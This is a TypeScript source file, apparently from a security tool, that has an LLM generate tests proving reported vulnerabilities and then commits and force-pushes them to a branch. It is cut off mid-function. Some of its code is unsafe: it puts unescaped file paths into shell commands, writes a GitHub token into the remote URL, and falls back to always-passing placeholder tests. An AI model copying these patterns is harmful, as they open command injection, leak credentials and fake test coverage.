/**
 * Validation Mode Implementation
 * RFC-041: Prove vulnerabilities exist with RED tests
 */

import { IssueContext, ActionConfig } from '../types/index.js';
import { logger } from '../utils/logger.js';
import { ValidationResult, TestExecutionResult, Vulnerability, TestFileContext, TestSuite, AttemptHistory, TestFramework } from './types.js';
import { vendorFilterUtils } from './vendor-utils.js';
import { TestGeneratingSecurityAnalyzer } from '../ai/test-generating-security-analyzer.js';
import { analyzeIssue } from '../ai/analyzer.js';
import { AIConfig } from '../ai/types.js';
import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import { getGitHubClient } from '../github/api.js';
import { PhaseDataClient } from './phase-data-client/index.js';
import { TestIntegrationClient } from './test-integration-client.js';
import { extractVulnerabilitiesFromIssue } from '../utils/vulnerability-extraction.js';
import { TEST_FILE_PATTERNS, EXCLUDED_DIRECTORIES } from '../constants/test-patterns.js';
import { classifyTestResult as classifyTestResultImpl } from '../utils/test-result-classifier.js';

export class ValidationMode {
  private config: ActionConfig;
  private falsePositiveCache: Set<string>;
  private repoPath: string;
  private phaseDataClient: PhaseDataClient | null;
  private testIntegrationClient: TestIntegrationClient | null;

  constructor(config: ActionConfig, repoPath?: string) {
    this.config = config;
    this.repoPath = repoPath || process.cwd();
    this.falsePositiveCache = new Set();

    // Initialize PhaseDataClient if API key is available
    this.phaseDataClient = config.rsolvApiKey
      ? new PhaseDataClient(config.rsolvApiKey)
      : null;

    // Initialize TestIntegrationClient if API key is available
    this.testIntegrationClient = config.rsolvApiKey
      ? new TestIntegrationClient(config.rsolvApiKey)
      : null;

    // Apply environment variables from config
    if (config.environmentVariables && typeof config.environmentVariables === 'object') {
      Object.entries(config.environmentVariables).forEach(([key, value]) => {
        if (typeof value === 'string') {
          process.env[key] = value;
          logger.debug(`Applied environment variable: ${key}`);
        }
      });
    }

    this.loadFalsePositiveCache();
  }
  
  /**
   * Validate a single vulnerability
   */
  async validateVulnerability(issue: IssueContext): Promise<ValidationResult> {
    const isTestingMode = process.env.RSOLV_TESTING_MODE === 'true';
    const executableTestsEnabled = this.config.executableTests ?? true; // RFC-060 Phase 5.1: Default enabled

    logger.info(`[VALIDATION MODE] Starting validation for issue #${issue.number}`);
    if (isTestingMode) {
      logger.info('[VALIDATION MODE] 🧪 TESTING MODE ENABLED - Will not filter based on test results');
    }

    // Extract vulnerabilities from issue body (shared across all code paths)
    const vulnerabilities = extractVulnerabilitiesFromIssue(issue);

    logger.info('[VALIDATION MODE] Extracted vulnerabilities from issue', {
      issueNumber: issue.number,
      vulnerabilitiesCount: vulnerabilities.length,
      files: vulnerabilities.map(v => v.file)
    });

    // RFC-060 Phase 5.1: Feature flag check - skip validation if disabled
    if (!executableTestsEnabled) {
      logger.info('[VALIDATION MODE] Executable tests disabled - skipping validation');
      return {
        issueId: issue.number,
        validated: true, // Mark as validated to allow mitigation phase to proceed
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }

    try {
      // Step 1: Ensure clean git state
      this.ensureCleanGitState();

      // Step 2: Check for vendor files FIRST (most token-efficient filter)
      const vendorFiles = await vendorFilterUtils.checkForVendorFiles(issue);
      if (vendorFiles.isVendor) {
        logger.info(`Issue #${issue.number} affects vendor files - marking as VENDORED`);
        return {
          issueId: issue.number,
          validated: false,
          vendoredFile: true,
          falsePositiveReason: 'Vulnerability in vendor file - requires library update',
          affectedVendorFiles: vendorFiles.files,
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 3: Check false positive cache (second filter)
      const cacheKey = this.getCacheKey(issue);
      if (this.falsePositiveCache.has(cacheKey) && !process.env.RSOLV_SKIP_CACHE) {
        logger.info(`Issue #${issue.number} is in false positive cache, skipping`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Previously identified as false positive',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 4: Analyze the issue
      logger.info(`Analyzing issue #${issue.number} for validation`);
      const analysisData = await analyzeIssue(issue, this.config);

      if (!analysisData.canBeFixed) {
        logger.warn(`Issue #${issue.number} cannot be validated: ${analysisData.cannotFixReason}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: analysisData.cannotFixReason || 'Analysis determined issue cannot be fixed',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }
      
      // Step 5: RFC-060-AMENDMENT-001 Pipeline — Framework-native test generation
      // Uses the already-implemented pipeline methods instead of standalone scripts
      logger.info(`[RFC-060-AMENDMENT-001] Starting framework-native test generation for issue #${issue.number}`);

      if (!this.testIntegrationClient) {
        throw new Error('TestIntegrationClient not initialized — RSOLV API key required for validation');
      }

      // Step 5a: Detect framework from vulnerable files
      const primaryFile = vulnerabilities[0]?.file || analysisData.filesToModify?.[0] || '';
      const frameworkName = this.detectFrameworkFromFile(primaryFile);
      const framework = this.detectFrameworkFromPath(
        primaryFile.replace(/\.(js|ts|rb|py|java|php|ex|exs)$/, '.test.$1')
      );
      logger.info(`Detected framework: ${frameworkName} for ${primaryFile}`);

      // Step 5b: Scan for existing test files
      const candidateTestFiles = await this.scanTestFiles(frameworkName);
      logger.info(`Found ${candidateTestFiles.length} test files in repository`);

      // Step 5c: Build vulnerability context with enclosing function extraction
      const vuln = vulnerabilities[0];
      let vulnerableCode = '';
      if (vuln && primaryFile) {
        try {
          const fullPath = path.resolve(this.repoPath, primaryFile);
          if (fs.existsSync(fullPath)) {
            const fullFileContent = fs.readFileSync(fullPath, 'utf8');
            // Use enclosing function if available from SCAN phase AST validation
            if (vuln.enclosingFunction) {
              const { startLine, endLine } = vuln.enclosingFunction;
              const lines = fullFileContent.split('\n');
              vulnerableCode = lines.slice(startLine - 1, endLine).join('\n');
              logger.info(`Using enclosing function '${vuln.enclosingFunction.name}' (lines ${startLine}-${endLine}) as context`);
            } else {
              vulnerableCode = fullFileContent;
              logger.info('No enclosing function available, using full file as context');
            }
          }
        } catch (readError) {
          logger.warn(`Could not read vulnerable file ${primaryFile}: ${readError}`);
        }
      }

      // Step 5d: Select or create target test file
      let targetTestFile: TestFileContext;
      if (candidateTestFiles.length > 0) {
        try {
          // Use backend to score and select the best target test file
          const analysis = await this.testIntegrationClient.analyze({
            vulnerableFile: primaryFile,
            vulnerabilityType: vuln?.type || issue.title,
            candidateTestFiles,
            framework: frameworkName
          });

          const targetPath = analysis.recommendations?.[0]?.path || candidateTestFiles[0];
          logger.info(`Backend recommended target: ${targetPath} (score: ${analysis.recommendations?.[0]?.score})`);

          const targetFullPath = path.join(this.repoPath, targetPath);
          const targetContent = fs.existsSync(targetFullPath)
            ? fs.readFileSync(targetFullPath, 'utf8')
            : '';

          targetTestFile = {
            path: targetPath,
            content: targetContent,
            framework: frameworkName
          };
        } catch (analyzeError) {
          logger.warn(`Backend analyze failed, using first test file: ${analyzeError}`);
          const fallbackPath = candidateTestFiles[0];
          const fallbackFullPath = path.join(this.repoPath, fallbackPath);
          targetTestFile = {
            path: fallbackPath,
            content: fs.existsSync(fallbackFullPath) ? fs.readFileSync(fallbackFullPath, 'utf8') : '',
            framework: frameworkName
          };
        }
      } else {
        // No test files exist — create a fallback path based on framework conventions
        const testDirMap: Record<string, string> = {
          'mocha': 'test/unit',
          'jest': '__tests__',
          'vitest': '__tests__',
          'rspec': 'spec',
          'pytest': 'tests',
          'phpunit': 'tests',
          'exunit': 'test'
        };
        const testDir = testDirMap[frameworkName] || 'test';
        const ext = this.getLanguageExtension(frameworkName);
        const fallbackPath = `${testDir}/vulnerability_validation${ext}`;
        logger.info(`No test files found — using fallback path: ${fallbackPath}`);

        targetTestFile = {
          path: fallbackPath,
          content: '', // Empty — new file
          framework: frameworkName
        };
      }

      // Step 5e: Build vulnerability descriptor for test generation
      const vulnerabilityDescriptor: Vulnerability = {
        type: vuln?.type || 'unknown',
        description: vuln?.description || issue.title,
        location: `${primaryFile}:${vuln?.line || 0}`,
        attackVector: vuln?.type || 'unknown',
        vulnerablePattern: vulnerableCode.slice(0, 500), // Truncate for prompt
        source: primaryFile
      };

      // Step 5f: Generate test with retry loop (existing RFC-060 method)
      logger.info('Generating RED test with retry loop...');
      const testSuite = await this.generateTestWithRetry(
        vulnerabilityDescriptor,
        targetTestFile,
        3 // maxAttempts
      );

      if (!testSuite) {
        logger.warn(`Failed to generate valid RED test after retries for issue #${issue.number}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Unable to generate valid RED test after 3 attempts',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      logger.info(`✅ RED test generated: ${testSuite.testFile} (framework: ${testSuite.framework})`);

      // Step 6: Create validation branch and commit integrated test
      logger.info('Creating validation branch for test persistence');
      let branchName: string | null = null;

      try {
        branchName = await this.createValidationBranch(issue);

        // AST-integrate the test into the target file via backend
        let targetFile = testSuite.testFile;
        let integratedContent = testSuite.redTests[0]?.testCode || '';

        try {
          const integration = await this.integrateTestsWithBackendRetry(testSuite, issue);
          targetFile = integration.targetFile;
          integratedContent = integration.content;
          logger.info(`AST integration succeeded: ${targetFile}`);
        } catch (integrationError) {
          logger.warn(`AST integration failed, writing test directly: ${integrationError}`);
          // Write to the target test file path directly
        }

        // Write integrated test to the repo's test directory (not .rsolv/tests/)
        const fullTargetPath = path.join(this.repoPath, targetFile);
        fs.mkdirSync(path.dirname(fullTargetPath), { recursive: true });
        fs.writeFileSync(fullTargetPath, integratedContent, 'utf8');

        // Commit
        execSync('git config user.email "rsolv-validation@rsolv.dev"', { cwd: this.repoPath });
        execSync('git config user.name "RSOLV Validation Bot"', { cwd: this.repoPath });
        execSync(`git add "${targetFile}"`, { cwd: this.repoPath });
        execSync(`git commit -m "Add RED test proving vulnerability for issue #${issue.number}"`, { cwd: this.repoPath });
        logger.info(`✅ Tests committed to validation branch: ${branchName} (file: ${targetFile})`);

        // Push to remote
        try {
          const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
          if (token && process.env.GITHUB_REPOSITORY) {
            const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
            const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
            try {
              execSync(`git remote set-url origin ${authenticatedUrl}`, { cwd: this.repoPath });
            } catch (configError) {
              logger.debug('Could not configure authenticated remote');
            }
          }
          execSync(`git push -f origin ${branchName}`, { cwd: this.repoPath });
          logger.info(`Pushed validation branch ${branchName} to remote`);
        } catch (pushError) {
          logger.warn(`Could not push validation branch to remote: ${pushError}`);
        }
      } catch (branchError) {
        logger.warn(`Could not create validation branch: ${branchError}`);
      }

      // Step 7: The test was already run by generateTestWithRetry()
      // If we got here, the RED test FAILED on vulnerable code (proving vulnerability)
      const testExecutionResult: TestExecutionResult = {
        passed: false, // RED test must have failed (generateTestWithRetry ensures this)
        output: 'RED test failed on vulnerable code — vulnerability proven',
        stderr: '',
        timedOut: false,
        exitCode: 1,
        framework: testSuite.framework,
        testFile: testSuite.testFile
      };

      const testResultsForDisplay = {
        passed: 0,
        failed: testSuite.redTests.length,
        total: testSuite.redTests.length,
        output: 'RED tests failed as expected (vulnerability proven)',
        exitCode: 1
      };

      // Step 8: Vulnerability validated — RED test failed on vulnerable code
      logger.info('✅ Vulnerability validated! RED tests failed as expected');

      // Add validated label
      await this.addGitHubLabel(issue, 'rsolv:validated');

      // Store via PhaseDataClient
      await this.storeTestExecutionInPhaseData(issue, testExecutionResult, true, branchName || undefined, vulnerabilities);

      return {
        issueId: issue.number,
        validated: true,
        branchName: branchName || undefined,
        redTests: testSuite,
        testResults: testResultsForDisplay,
        testExecutionResult,
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };

    } catch (error) {
      logger.error(`Validation failed for issue #${issue.number}:`, error);
      return {
        issueId: issue.number,
        validated: false,
        falsePositiveReason: `Validation error: ${error}`,
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }
  }

  /**
   * Validate multiple vulnerabilities in batch
   */
  async validateBatch(issues: IssueContext[]): Promise<ValidationResult[]> {
    logger.info(`[VALIDATION MODE] Validating batch of ${issues.length} issues`);
    const results: ValidationResult[] = [];
    
    for (const issue of issues) {
      const result = await this.validateVulnerability(issue);
      results.push(result);
      
      // Add delay between validations to avoid rate limits
      if (issues.indexOf(issue) < issues.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
    
    // Summary
    const validated = results.filter(r => r.validated).length;
    const falsePositives = results.filter(r => !r.validated).length;
    
    logger.info('[VALIDATION MODE] Batch complete:');
    logger.info(`  - Validated: ${validated}`);
    logger.info(`  - False positives: ${falsePositives}`);
    
    return results;
  }



  /**
   * RFC-058: Create validation branch for test persistence
   */
  async createValidationBranch(issue: IssueContext): Promise<string> {
    const branchName = `rsolv/validate/issue-${issue.number}`;

    try {
      // RFC-060: Create and checkout validation branch for test persistence
      execSync(`git checkout -b ${branchName}`, {
        cwd: this.repoPath
      });

      logger.info(`Created validation branch: ${branchName}`);

      return branchName;
    } catch (error) {
      logger.error(`Failed to create validation branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Convert test content object to executable JavaScript
   *
   * Handles multiple input formats:
   * - String: pass through (already executable)
   * - { redTests: [...] }: Array of test objects with testName/testCode
   * - { red: {...} }: Single test object with testName/testCode
   * - { tests: [...] }: TestSuite format with GeneratedTest[]
   */
  private convertToExecutableTest(testContent: unknown): string {
    // String content - sanitize and pass through
    if (typeof testContent === 'string') {
      return this.sanitizeTestStructure(testContent);
    }

    // Not an object - wrap in minimal test structure
    if (!testContent || typeof testContent !== 'object') {
      return `describe('Vulnerability Test', () => {
  it('validates vulnerability', () => {
    // ${String(testContent)}
    expect(true).toBe(true);
  });
});
`;
    }

    const content = testContent as Record<string, unknown>;

    // Handle { redTests: [...] } format
    if (Array.isArray(content.redTests)) {
      const tests = content.redTests
        .map((test: { testName?: string; testCode?: string }, index: number) => {
          const name = test.testName || `Test ${index + 1}`;
          const code = test.testCode || 'expect(true).toBe(true);';

          // If testCode already has framework structure, include it directly
          if (this.hasFrameworkStructure(code)) {
            return this.indentCode(code, 2);
          }

          return `  it('${this.escapeTestName(name)}', () => {
${this.indentCode(code, 4)}
  });`;
        })
        .join('\n\n');

      return `describe('Vulnerability Validation Tests', () => {
${tests}
});
`;
    }

    // Handle { red: {...} } single test format
    if (content.red && typeof content.red === 'object') {
      const test = content.red as { testName?: string; testCode?: string };
      const code = test.testCode || 'expect(true).toBe(true);';

      // If testCode already has framework structure, use it directly
      if (this.hasFrameworkStructure(code)) {
        return code;
      }

      const name = test.testName || 'Vulnerability Test';
      return `describe('Vulnerability Validation Tests', () => {
  it('${this.escapeTestName(name)}', () => {
${this.indentCode(code, 4)}
  });
});
`;
    }

    // Handle { tests: [...] } TestSuite format
    if (Array.isArray(content.tests)) {
      const tests = content.tests
        .map((test: { testCode?: string }, index: number) => {
          const code = test.testCode || 'expect(true).toBe(true);';

          // If testCode already has framework structure, include it directly
          if (this.hasFrameworkStructure(code)) {
            return this.indentCode(code, 2);
          }

          return `  it('Test ${index + 1}', () => {
${this.indentCode(code, 4)}
  });`;
        })
        .join('\n\n');

      return `describe('Vulnerability Validation Tests', () => {
${tests}
});
`;
    }

    // Unknown object format - create minimal wrapper
    logger.warn('Unknown test content format, creating minimal test wrapper');
    return `describe('Vulnerability Validation Tests', () => {
  it('validates vulnerability', () => {
    // Test content could not be properly parsed
    expect(true).toBe(true);
  });
});
`;
  }

  /**
   * Convert test content to executable code and sanitize the result.
   * Wraps convertToExecutableTest to ensure sanitization always runs,
   * even when the input is an object whose testCode contains nested test() blocks.
   */
  private convertToExecutableTestSanitized(testContent: unknown): string {
    const code = this.convertToExecutableTest(testContent);
    // Always sanitize the final output, regardless of input type
    return this.sanitizeTestStructure(code);
  }

  /**
   * Sanitize test structure to fix common AI-generated issues.
   *
   * Detects nested it()/test() blocks (invalid in Jest/Vitest/Mocha) and
   * replaces inner test() calls with plain function bodies.
   * e.g. it('name', () => { test('inner', () => { ... }) })
   * becomes it('name', () => { ... })
   */
  private sanitizeTestStructure(code: string): string {
    const hasIt = /\bit\s*\(/.test(code);
    const hasTest = /\btest\s*\(/.test(code);

    // Quick exit: if there's no it() block, there can't be nesting inside it()
    if (!hasIt) {
      return code;
    }

    // Line-based approach with brace depth tracking:
    // Strip inner test()/describe()/it() wrappers nested inside it() blocks.
    // Track brace depth to correctly find the closing }); of nested blocks,
    // ignoring inner closings from callbacks, arrow functions, etc.
    const lines = code.split('\n');
    const result: string[] = [];
    let inIt = false;
    let itBraceDepth = 0;
    let currentBraceDepth = 0;
    let inNestedBlock = false;
    let nestedBlockBraceDepth = 0;
    let justEnteredIt = false;

    for (const line of lines) {
      const opens = (line.match(/\{/g) || []).length;
      const closes = (line.match(/\}/g) || []).length;

      // Detect entering an it() block (only the outermost one)
      if (/^\s*it\s*\(/.test(line) && !inIt && !inNestedBlock) {
        inIt = true;
        justEnteredIt = true;
        itBraceDepth = currentBraceDepth;
      }

      // Inside it(): detect nested test(), describe(), or it() opening wrapper
      // Skip the line that just opened the it() block (justEnteredIt flag)
      if (inIt && !justEnteredIt && !inNestedBlock && /^\s*(test|describe|it)\s*\(/.test(line)) {
        inNestedBlock = true;
        nestedBlockBraceDepth = opens - closes;
        currentBraceDepth += opens - closes;
        // Skip the wrapper line — its body will be kept
        continue;
      }

      justEnteredIt = false;

      if (inNestedBlock) {
        nestedBlockBraceDepth += opens - closes;
        currentBraceDepth += opens - closes;

        // When depth drops to 0 (or below) and line looks like a closing, we found the end
        if (nestedBlockBraceDepth <= 0 && /^\s*\}\s*\)\s*;?\s*$/.test(line.trim())) {
          inNestedBlock = false;
          nestedBlockBraceDepth = 0;
          continue;
        }

        // Otherwise, keep the line (it's the body, just strip the wrapper)
        result.push(line);
        continue;
      }

      currentBraceDepth += opens - closes;

      // Track when we leave an it() block
      if (inIt && currentBraceDepth <= itBraceDepth && /^\s*\}\s*\)\s*;?\s*$/.test(line.trim())) {
        inIt = false;
      }

      result.push(line);
    }

    return result.join('\n');
  }

  /**
   * Check if code already contains complete test framework structure.
   * Returns true only when the code has a describe() block, indicating it's
   * a fully-structured test. Individual it()/test() calls without describe()
   * still need a wrapper and will be caught by sanitizeTestStructure() if nested.
   */
  private hasFrameworkStructure(code: string): boolean {
    return /\bdescribe\s*\(/.test(code);
  }

  /**
   * Helper: Escape single quotes in test names for JavaScript strings
   */
  private escapeTestName(name: string): string {
    return name.replace(/'/g, '\\\'').replace(/\n/g, ' ');
  }

  /**
   * Helper: Indent code block by specified number of spaces
   */
  private indentCode(code: string, spaces: number): string {
    const indent = ' '.repeat(spaces);
    return code
      .trim()
      .split('\n')
      .map(line => indent + line)
      .join('\n');
  }

  /**
   * RFC-060-AMENDMENT-001: Validate JavaScript syntax before writing test file
   *
   * Uses Function constructor to parse code without executing it.
   * Throws SyntaxError if code is invalid.
   */
  private validateTestSyntax(code: string): void {
    try {
      // Function constructor parses but doesn't execute
      new Function(code);
    } catch (error) {
      if (error instanceof SyntaxError) {
        throw new Error(`Invalid JavaScript syntax in generated test: ${error.message}`);
      }
      // Other errors (like ReferenceError) are runtime errors, which are expected
      // for RED tests that reference undefined functions
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Classify test execution result
   *
   * Distinguishes between valid test failures (vulnerability proven) and
   * errors (syntax errors, missing dependencies, etc.) that don't prove anything.
   */
  classifyTestResult(exitCode: number, stdout: string, stderr: string): {
    type: 'test_passed' | 'test_failed' | 'syntax_error' | 'runtime_error' |
          'missing_dependency' | 'command_not_found' | 'oom_killed' | 'terminated' | 'unknown';
    isValidFailure: boolean;
    reason: string;
  } {
    return classifyTestResultImpl(exitCode, stdout, stderr);
  }

  /**
   * RFC-058 + RFC-060-AMENDMENT-001 Phase 2: Commit generated tests to validation branch
   * Uses retry with exponential backoff for backend integration
   *
   * Philosophy: If backend is down, we can't fully service the customer anyway.
   * Better to fail fast and maintain clear state than silently degrade.
   */
  async commitTestsToBranch(testContent: unknown, branchName: string, issue?: IssueContext): Promise<void> {
    try {
      // Backend integration required — no .rsolv/tests/ fallback
      const result = await this.integrateTestsWithBackendRetry(testContent, issue);
      const targetFile = result.targetFile;
      const integratedContent = result.content;
      logger.info(`✅ Backend integration succeeded: ${targetFile}`);

      // Write integrated content to the repo's test directory
      const fullTargetPath = path.join(this.repoPath, targetFile);
      fs.mkdirSync(path.dirname(fullTargetPath), { recursive: true });
      fs.writeFileSync(fullTargetPath, integratedContent, 'utf8');

      // Configure git identity for commits
      execSync('git config user.email "rsolv-validation@rsolv.dev"', { cwd: this.repoPath });
      execSync('git config user.name "RSOLV Validation Bot"', { cwd: this.repoPath });

      // Commit to branch
      execSync(`git add "${targetFile}"`, { cwd: this.repoPath });
      execSync('git commit -m "Add validation tests for issue"', { cwd: this.repoPath });

      logger.info(`Committed tests to branch ${branchName} (target: ${targetFile})`);

      // RFC-058: Push validation branch to remote for mitigation phase
      try {
        const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
        if (token && process.env.GITHUB_REPOSITORY) {
          const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
          const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
          try {
            execSync(`git remote set-url origin ${authenticatedUrl}`, { cwd: this.repoPath });
          } catch (configError) {
            logger.debug('Could not configure authenticated remote');
          }
        }

        execSync(`git push -f origin ${branchName}`, { cwd: this.repoPath });
        logger.info(`Pushed validation branch ${branchName} to remote`);
      } catch (pushError) {
        logger.warn(`Could not push validation branch to remote: ${pushError}`);
      }
    } catch (error) {
      logger.error(`Failed to commit tests to branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * RFC-060-AMENDMENT-001 Phase 2: Integrate tests with backend using retry logic
   * Retries with exponential backoff: 1s, 2s, 4s
   */
  private async integrateTestsWithBackendRetry(
    testContent: any,
    issue?: IssueContext
  ): Promise<{ targetFile: string; content: string }> {
    const maxAttempts = 3;
    const baseDelay = 1000; // 1 second

    if (!this.testIntegrationClient) {
      throw new Error('TestIntegrationClient not initialized - check API key configuration');
    }

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        logger.debug(`Backend integration attempt ${attempt}/${maxAttempts}...`);

        // Step 1: Scan for test files
        const candidateTestFiles = await this.scanTestFiles();
        if (candidateTestFiles.length === 0) {
          throw new Error('No test files found in repository');
        }

        // Step 2: Detect framework from vulnerable file
        const framework = this.detectFrameworkFromFile(issue?.file || '');

        // Step 3: Analyze test files to find best target
        const analysis = await this.testIntegrationClient.analyze({
          vulnerableFile: issue?.file || 'unknown',
          vulnerabilityType: issue?.title || 'unknown',
          candidateTestFiles,
          framework
        });

        if (!analysis.recommendations || analysis.recommendations.length === 0) {
          throw new Error('Backend returned no test file recommendations');
        }

        const targetPath = analysis.recommendations[0].path;
        logger.info(`Backend recommended target file: ${targetPath} (score: ${analysis.recommendations[0].score})`);

        // Step 4: Read target file content
        const targetFilePath = path.join(this.repoPath, targetPath);
        if (!fs.existsSync(targetFilePath)) {
          throw new Error(`Recommended target file does not exist: ${targetPath}`);
        }
        const targetFileContent = fs.readFileSync(targetFilePath, 'utf8');

        // Step 5: Format test suite for backend API
        const testSuite = this.formatTestSuite(testContent);

        // Step 6: Detect language from target file
        const language = this.detectLanguage(targetPath);

        // Step 7: Generate AST-integrated test
        const generated = await this.testIntegrationClient.generate({
          targetFileContent,
          testSuite,
          framework,
          language
        });

        logger.info(`Backend integration succeeded using ${generated.method} method`);
        if (generated.insertionPoint) {
          logger.debug(`Insertion point: line ${generated.insertionPoint.line}, strategy: ${generated.insertionPoint.strategy}`);
        }

        // Step 8: Return integrated result
        return {
          targetFile: targetPath,
          content: generated.integratedContent
        };

      } catch (error) {
        const isLastAttempt = attempt === maxAttempts;

        if (isLastAttempt) {
          logger.error(`Backend integration failed after ${maxAttempts} attempts`);
          throw error;
        }

        // Check if error is retryable
        const isRetryable = this.isRetryableError(error);
        if (!isRetryable) {
          logger.error(`Non-retryable error: ${error}`);
          throw error;
        }

        // Exponential backoff: 1s, 2s, 4s
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`Attempt ${attempt} failed (${error}), retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }

    throw new Error('Backend integration failed after all retry attempts');
  }

  /**
   * Determine if error is retryable (transient vs permanent)
   */
  private isRetryableError(error: any): boolean {
    const errorMessage = String(error).toLowerCase();

    // Retryable: Network issues, timeouts, 5xx errors
    const retryablePatterns = [
      'timeout',
      'econnrefused',
      'enotfound',
      'network',
      '503', // Service Unavailable
      '502', // Bad Gateway
      '504', // Gateway Timeout
      '429'  // Too Many Requests (rate limit)
    ];

    // Non-retryable: 4xx client errors (except 429)
    const nonRetryablePatterns = [
      '400', // Bad Request
      '401', // Unauthorized
      '403', // Forbidden
      '404', // Not Found
      '422'  // Unprocessable Entity
    ];

    // Check non-retryable first (more specific)
    if (nonRetryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return false;
    }

    // Check retryable patterns
    if (retryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return true;
    }

    // Default: retry on unknown errors (safer)
    return true;
  }


  /**
   * Load false positive cache
   */
  private loadFalsePositiveCache(): void {
    try {
      const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
      if (fs.existsSync(cachePath)) {
        const data = JSON.parse(fs.readFileSync(cachePath, 'utf8'));
        data.entries?.forEach((entry: any) => {
          // Skip expired entries
          if (entry.expiresAt && new Date(entry.expiresAt) < new Date()) {
            return;
          }
          this.falsePositiveCache.add(entry.pattern);
        });
        logger.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`);
      }
    } catch (error) {
      logger.warn('Could not load false positive cache:', error);
    }
  }
  
  /**
   * Add issue to false positive cache
   */
  private addToFalsePositiveCache(issue: IssueContext): void {
    const cacheKey = this.getCacheKey(issue);
    this.falsePositiveCache.add(cacheKey);
    
    // Persist to disk
    const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
    const cacheDir = path.dirname(cachePath);
    fs.mkdirSync(cacheDir, { recursive: true });
    
    const entries = Array.from(this.falsePositiveCache).map(pattern => ({
      pattern,
      timestamp: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString() // 30 days
    }));
    
    fs.writeFileSync(cachePath, JSON.stringify({ entries, version: '1.0' }, null, 2));
    logger.info(`Added issue #${issue.number} to false positive cache`);
  }
  
  /**
   * Get cache key for issue
   */
  private getCacheKey(issue: IssueContext): string {
    // Create a unique key based on issue characteristics
    return `${issue.repository}#${issue.number}#${issue.title}`;
  }
  
  /**
   * Ensure git repository is in clean state
   */
  private ensureCleanGitState(): void {
    try {
      const status = execSync('git status --porcelain', { encoding: 'utf8' });
      if (status.trim()) {
        throw new Error('Repository has uncommitted changes');
      }
    } catch (error) {
      logger.warn('Git state check failed:', error);
    }
  }
  

  /**
   * Get current git commit hash
   */
  private getCurrentCommitHash(): string {
    try {
      return execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();
    } catch {
      return 'unknown';
    }
  }

  /**
   * RFC-060 Phase 2.2: Add GitHub label to issue
   */
  private async addGitHubLabel(issue: IssueContext, label: string): Promise<void> {
    try {
      const githubClient = getGitHubClient(this.config);
      await githubClient.issues.addLabels({
        owner: issue.repository.owner,
        repo: issue.repository.name,
        issue_number: issue.number,
        labels: [label]
      });
      logger.info(`Added label '${label}' to issue #${issue.number}`);
    } catch (error) {
      logger.warn(`Failed to add label '${label}' to issue #${issue.number}:`, error);
    }
  }

  /**
   * RFC-060 Phase 2.2 & 3.1: Store test execution results in PhaseDataClient
   */
  private async storeTestExecutionInPhaseData(
    issue: IssueContext,
    testExecution: TestExecutionResult,
    validated: boolean,
    branchName?: string,
    vulnerabilities?: Array<{ file: string; line: number; type: string; description?: string; confidence?: number | string }>
  ): Promise<void> {
    if (!this.phaseDataClient) {
      logger.debug('PhaseDataClient not available, skipping phase data storage');
      return;
    }

    try {
      await this.phaseDataClient.storePhaseResults(
        'validate',
        {
          validate: {
            [issue.number]: {
              validated,
              branchName,
              testPath: testExecution.testFile,
              testExecutionResult: testExecution,
              vulnerabilities,
              timestamp: new Date().toISOString()
            }
          }
        },
        {
          repo: issue.repository.fullName,
          issueNumber: issue.number,
          commitSha: this.getCurrentCommitHash()
        }
      );
      logger.info(`Stored test execution results in PhaseDataClient for issue #${issue.number}`);
    } catch (error) {
      logger.warn('Failed to store test execution in PhaseDataClient:', error);
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Generate test with retry loop
   * Implements LLM-based test generation with error feedback and retry logic
   */
  async generateTestWithRetry(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    maxAttempts: number = 3
  ): Promise<TestSuite | null> {
    const previousAttempts: AttemptHistory[] = [];
    const framework = this.detectFrameworkFromPath(targetTestFile.path);

    logger.info(`Starting test generation with retry (max ${maxAttempts} attempts)`);
    logger.info(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.info(`Target test file: ${targetTestFile.path}`);

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      logger.info(`Attempt ${attempt}/${maxAttempts}: Generating test...`);

      try {
        // 1. Generate test with LLM (pass target file content + previous errors)
        const testSuite = await this.generateTestWithLLM(
          vulnerability,
          targetTestFile,
          previousAttempts,
          framework
        );

        // 2. Write to temp file
        const tempDir = path.join(this.repoPath, '.rsolv', 'temp');
        fs.mkdirSync(tempDir, { recursive: true });

